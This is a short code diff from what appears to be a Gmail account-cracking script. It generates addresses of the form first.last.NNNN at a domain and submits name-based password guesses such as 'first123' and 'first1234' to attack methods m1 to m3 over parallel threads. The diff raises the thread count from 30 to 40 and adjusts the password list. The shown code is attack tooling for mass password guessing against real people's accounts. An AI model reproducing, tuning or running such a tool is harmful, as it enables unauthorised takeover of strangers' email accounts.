@@ -675,14 +675,14 @@ def gM1():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         idf.append(nmp)
-    with tred(max_workers=30) as king_xd:
+    with tred(max_workers=40) as king_xd:
         os.system('clear')
         idx = str(len(idf))
         tk = first+last
         os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);print(led)
         for number in idf:
             idf = first+'.'+last+'.'+number+domain
-            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12'] 
+            pwv= [first+last,first+' '+last,first+'12',last,first+number,first+'123',first+'1234',first+last+'12'] 
             if mthd in ['1','01']:king_xd.submit(m1,idf,pwv)
             elif mthd in ['2','02']:king_xd.submit(m2,idf,pwv)
             elif mthd in ['3','03']:king_xd.submit(m3,idf,pwv)
